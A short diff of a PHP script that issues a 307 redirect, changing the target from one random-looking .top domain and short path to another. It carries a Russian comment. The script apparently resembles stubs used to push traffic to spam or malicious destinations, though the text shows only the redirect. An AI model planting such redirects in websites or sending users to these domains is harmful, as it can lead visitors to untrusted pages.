@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://homeradar.top/7xntB9');
+header('Location: https://serversomirax.top/5Xff2f');
 exit();
 ?>
